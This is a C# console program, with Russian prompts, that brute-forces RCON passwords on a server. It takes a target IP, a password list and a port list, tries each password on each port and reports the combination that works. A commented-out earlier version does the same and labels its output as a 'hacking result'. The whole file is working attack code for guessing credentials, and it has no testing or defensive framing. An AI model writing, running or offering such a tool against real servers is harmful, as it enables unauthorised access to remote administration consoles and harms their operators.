using Microsoft.VisualBasic.FileIO;
using RconSharp;
using System.Net.Sockets;
using System.Net;
using System.Threading.Tasks;
using System.Transactions;
using System.Text;

namespace AutoLogin;

class Program
{
    public static void Main()
    {
        string ip = "";
        RconClient rcon = default(RconClient);


        string finalPass = "";
        int finalPort = -1;

        bool isBruted = false;

        Console.Write($"IP: ");
        ip = Console.ReadLine();

        Console.Write("Файл базы паролей: ");
        string passwordPath = Console.ReadLine();
        string[] passwords = File.ReadAllLines(passwordPath);

        Console.Write("Файл базы портов: ");
        string portPath = Console.ReadLine();
        string[] ports = File.ReadAllLines(portPath);


        foreach (var port in ports)
        {
            int iPort = int.Parse(port);
            Console.WriteLine("Порт: " + iPort);

            rcon = RconClient.Create(ip, iPort);
            try
            {
                rcon.ConnectAsync().Wait();
                Console.WriteLine("Подключение установлено!");
                foreach (var password in passwords)
                {
                    Task<bool> connection = rcon.AuthenticateAsync(password);
                    connection.Wait();

                    if (connection.Result == true)
                    {
                        isBruted = true;
                        finalPass = password;
                        break;
                    }

                }
            }
            catch { }

            if (isBruted)
            {
                finalPort = iPort;
                break;
            }
        }

        if (isBruted)
        {
            Console.WriteLine($"\nУспех!\nПорт: {finalPort}\nПароль: {finalPass}\n");
        }
        else
        {
            Console.WriteLine("\nНеудача!");
        }

        Console.ReadKey();
    }
    //public static void Main()
    //{
    //    RconClient rcon = default(RconClient);
    //    string ip = "localhost";
    //    string passwordPath = "";
    //    string[] ports = File.ReadAllLines("ports.txt");
    //    string[] passwords = default(string[]);

    //    string finalPassword = "";
    //    int finalPort = -1;
    //    int iterator = 0;
    //    bool brut = false;

    //    Console.Write("Введите IP: ");
    //    ip = Console.ReadLine();
    //    Console.Write("Файл базы паролей: ");
    //    passwordPath = Console.ReadLine();

    //    try
    //    {
    //        passwords = File.ReadAllLines(passwordPath);
    //    }
    //    catch (FileNotFoundException e)
    //    {
    //        Console.WriteLine("Ошибка, не найдено файла с названием" + passwordPath + "!\n");
    //    }

    //    foreach (var port in ports)
    //    {
    //        iterator = 0;
    //        Console.WriteLine("Подбор по порту: " + port);
    //        int iPort = int.Parse(port);

    //        foreach (var password in passwords)
    //        {
    //            ++iterator;
    //            if(iterator % 100 == 0 && iterator != 0)
    //            {
    //                Console.WriteLine("Попытка #" + iterator);
    //            }
    //            rcon = RconClient.Create(ip, iPort);
    //            try
    //            {
    //                rcon.ConnectAsync().Wait();
    //            }
    //            catch { }
    //            Task<bool> connection = rcon.AuthenticateAsync(password);

    //            try
    //            {
    //                if (connection != null)
    //                {
    //                    if (connection.Result == true)
    //                    {
    //                        brut = true;
    //                        finalPassword = password;
    //                        break;
    //                    }
    //                }
    //            }
    //            catch{ };

    //            GC.Collect();
    //        }

    //        rcon.Disconnect();

    //        if (brut == true)
    //        {
    //            finalPort = iPort;
    //            break;
    //        }
    //    }

    //    Console.Write("\nРезультат взлома: ");

    //    if (brut == true)
    //    {
    //        Console.WriteLine("Успешно!\n");
    //        Console.WriteLine("IP: " + ip);
    //        Console.WriteLine("Порт: " + finalPort);
    //        Console.WriteLine("Пароль: " + finalPassword);
    //        Console.WriteLine();
    //    }
    //    else
    //    {
    //        Console.WriteLine("Ошибка!");
    //        Console.WriteLine();
    //    }

    //    Console.ReadKey();
    //}
}

